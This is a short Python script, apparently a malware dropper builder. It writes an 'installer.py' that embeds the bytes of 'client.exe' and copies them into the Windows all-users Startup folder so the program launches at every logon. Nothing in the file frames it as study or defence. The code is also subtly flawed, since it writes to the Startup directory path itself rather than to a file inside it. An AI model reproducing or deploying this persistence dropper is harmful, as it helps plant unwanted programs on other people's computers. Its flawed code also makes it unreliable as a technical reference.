script=f"""import time

if __name__=='__main__':
    try:
        startup_path="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"
        payload={open("client.exe","rb").read()}
        open(startup_path,"wb").write(payload)
        print("Installed")
    except Exception as e:
        print(e)
    finally:
        time.sleep(10)
"""

open("installer.py","w").write(script)